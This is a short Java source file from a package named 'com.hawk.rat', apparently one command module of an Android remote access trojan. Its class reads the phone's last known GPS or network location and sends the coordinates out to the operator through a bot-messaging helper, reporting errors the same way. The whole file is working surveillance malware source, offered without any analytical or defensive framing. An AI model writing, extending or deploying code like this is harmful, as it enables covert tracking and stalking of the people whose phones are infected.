package com.hawk.rat;
import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
public class CmdGps {
    private final Context ctx;
    public CmdGps(Context c) { this.ctx = c; }
    public void run() {
        new Thread(() -> {
            try {
                LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE); Location best = null;
                for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER}) {
                    try { Location l = lm.getLastKnownLocation(p); if (l != null && (best == null || l.getTime() > best.getTime())) best = l; } catch (Exception ignored) {}
                }
                if (best == null) BotApi.sendMessage(ctx, "No location"); else { BotApi.sendLocation(ctx, best.getLatitude(), best.getLongitude()); BotApi.sendMessage(ctx, "📍 Loc"); }
            } catch (Exception e) { BotApi.sendMessage(ctx, "gps err: "+e.getMessage()); }
        }).start();
    }
}
